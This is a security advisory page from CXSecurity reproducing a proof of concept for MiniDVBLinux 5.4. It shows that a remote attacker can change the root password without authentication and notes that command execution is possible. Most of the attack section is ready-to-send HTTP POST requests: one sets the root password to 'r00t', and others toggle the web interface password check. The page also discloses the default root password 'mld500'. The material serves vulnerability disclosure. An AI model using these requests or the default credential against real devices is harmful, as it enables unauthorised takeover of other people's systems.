---
title: MiniDVBLinux 5.4 Change Root Password
url: https://cxsecurity.com/issue/WLB-2022100044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-18
fetch_date: 2025-10-03T20:03:44.610962
---

# MiniDVBLinux 5.4 Change Root Password

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MiniDVBLinux 5.4 Change Root Password** **2022.10.17**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

MiniDVBLinux 5.4 Change Root Password PoC
Vendor: MiniDVBLinux
Product web page: https://www.minidvblinux.de
Affected version: <=5.4
Summary: MiniDVBLinux(TM) Distribution (MLD). MLD offers a simple
way to convert a standard PC into a Multi Media Centre based on the
Video Disk Recorder (VDR) by Klaus Schmidinger. Features of this
Linux based Digital Video Recorder: Watch TV, Timer controlled
recordings, Time Shift, DVD and MP3 Replay, Setup and configuration
via browser, and a lot more. MLD strives to be as small as possible,
modular, simple. It supports numerous hardware platforms, like classic
desktops in 32/64bit and also various low power ARM systems.
Desc: The application allows a remote attacker to change the root
password of the system without authentication (disabled by default)
and verification of previously assigned credential. Command execution
also possible using several POST parameters.
Tested on: MiniDVBLinux 5.4
BusyBox v1.25.1
Architecture: armhf, armhf-rpi2
GNU/Linux 4.19.127.203 (armv7l)
VideoDiskRecorder 2.4.6
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2022-5715
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5715.php
24.09.2022
--
Default root password: mld500
Change system password:
-----------------------
POST /?site=setup&section=System HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,mk;q=0.8,sr;q=0.7,hr;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 778
Content-Type: application/x-www-form-urlencoded
Cookie: fadein=true; sessid=fb9b4f16b50c4d3016ef434c760799fc; PHPSESSID=jbqjvk5omsb6pbpas78ll57qnpmvb4st7fk3r7slq80ecrdsubebn31tptjhvfba
Host: ip:8008
Origin: http://ip:8008
Referer: http://ip:8008/?site=setup&section=System
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
sec-gpc: 1
APT\_UPGRADE\_CHECK=1&APT\_SYSTEM\_ID=1&APT\_PACKAGE\_CLASS\_command=%2Fetc%2Fsetup%2Fapt.sh+setclass&APT\_PACKAGE\_CLASS=stable&SYSTEM\_NAME=MiniDVBLinux&SYSTEM\_VERSION\_command=%2Fetc%2Fsetup%2Fbase.sh+setversion&SYSTEM\_VERSION=5.4&SYSTEM\_PASSWORD\_command=%2Fetc%2Fsetup%2Fbase.sh+setpassword&SYSTEM\_PASSWORD=r00t&BUSYBOX\_ACPI\_command=%2Fetc%2Fsetup%2Fbusybox.sh+setAcpi&BUSYBOX\_NTPD\_command=%2Fetc%2Fsetup%2Fbusybox.sh+setNtpd&BUSYBOX\_NTPD=1&LOG\_LEVEL=1&SYSLOG\_SIZE\_command=%2Fetc%2Fsetup%2Finit.sh+setsyslog&SYSLOG\_SIZE=&LANG\_command=%2Fetc%2Fsetup%2Flocales.sh+setlang&LANG=en\_GB.UTF-8&TIMEZONE\_command=%2Fetc%2Fsetup%2Flocales.sh+settimezone&TIMEZONE=Europe%2FKumanovo&KEYMAP\_command=%2Fetc%2Fsetup%2Flocales.sh+setkeymap&KEYMAP=de-latin1&action=save&params=&changed=SYSTEM\_PASSWORD+
Pretty post data:
APT\_UPGRADE\_CHECK: 1
APT\_SYSTEM\_ID: 1
APT\_PACKAGE\_CLASS\_command: /etc/setup/apt.sh setclass
APT\_PACKAGE\_CLASS: stable
SYSTEM\_NAME: MiniDVBLinux
SYSTEM\_VERSION\_command: /etc/setup/base.sh setversion
SYSTEM\_VERSION: 5.4
SYSTEM\_PASSWORD\_command: /etc/setup/base.sh setpassword
SYSTEM\_PASSWORD: r00t
BUSYBOX\_ACPI\_command: /etc/setup/busybox.sh setAcpi
BUSYBOX\_NTPD\_command: /etc/setup/busybox.sh setNtpd
BUSYBOX\_NTPD: 1
LOG\_LEVEL: 1
SYSLOG\_SIZE\_command: /etc/setup/init.sh setsyslog
SYSLOG\_SIZE:
LANG\_command: /etc/setup/locales.sh setlang
LANG: en\_GB.UTF-8
TIMEZONE\_command: /etc/setup/locales.sh settimezone
TIMEZONE: Europe/Kumanovo
KEYMAP\_command: /etc/setup/locales.sh setkeymap
KEYMAP: de-latin1
action: save
params:
changed: SYSTEM\_PASSWORD
Eenable webif password check:
-----------------------------
POST /?site=setup&section=System HTTP/1.1
APT\_UPGRADE\_CHECK: 1
APT\_SYSTEM\_ID: 1
APT\_PACKAGE\_CLASS\_command: /etc/setup/apt.sh setclass
APT\_PACKAGE\_CLASS: stable
SYSTEM\_NAME: MiniDVBLinux
SYSTEM\_VERSION\_command: /etc/setup/base.sh setversion
SYSTEM\_VERSION: 5.4
SYSTEM\_PASSWORD\_command: /etc/setup/base.sh setpassword
SYSTEM\_PASSWORD:
BUSYBOX\_ACPI\_command: /etc/setup/busybox.sh setAcpi
BUSYBOX\_NTPD\_command: /etc/setup/busybox.sh setNtpd
BUSYBOX\_NTPD: 1
LOG\_LEVEL: 1
SYSLOG\_SIZE\_command: /etc/setup/init.sh setsyslog
SYSLOG\_SIZE:
LANG\_command: /etc/setup/locales.sh setlang
LANG: en\_GB.UTF-8
TIMEZONE\_command: /etc/setup/locales.sh settimezone
TIMEZONE: Europe/Berlin
KEYMAP\_command: /etc/setup/locales.sh setkeymap
KEYMAP: de-latin1
WEBIF\_PASSWORD\_CHECK: 1
action: save
params:
changed: WEBIF\_PASSWORD\_CHECK
Disable webif password check:
-----------------------------
POST /?site=setup&section=System HTTP/1.1
APT\_UPGRADE\_CHECK: 1
APT\_SYSTEM\_ID: 1
APT\_PACKAGE\_CLASS\_command: /etc/setup/apt.sh setclass
APT\_PACKAGE\_CLASS: stable
SYSTEM\_NAME: MiniDVBLinux
SYSTEM\_VERSION\_command: /etc/setup/base.sh setversion
SYSTEM\_VERSION: 5.4
SYSTEM\_PASSWORD\_command: /etc/setup/base.sh setpassword
SYSTEM\_PASSWORD:
BUSYBOX\_ACPI\_command: /etc/setup/busybox.sh setAcpi
BUSYBOX\_NTPD\_command: /etc/setup/busybox.sh setNtpd
BUSYBOX\_NTPD: 1
LOG\_LEVEL: 1
SYSLOG\_SIZE\_command: /etc/setup/init.sh setsyslog
SYSLOG\_SIZE:
LANG\_command: /etc/setup/locales.sh setlang
LANG: en\_GB.UTF-8
TIMEZONE\_command: /etc/setup/locales.sh settimezone
TIMEZONE: Europe/Berlin
KEYMAP\_command: /etc/setup/locales.sh setkeymap
KEYMAP: de-latin1
action: save
params:
changed: WEBIF\_PASSWORD\_CHECK

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100044)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | D...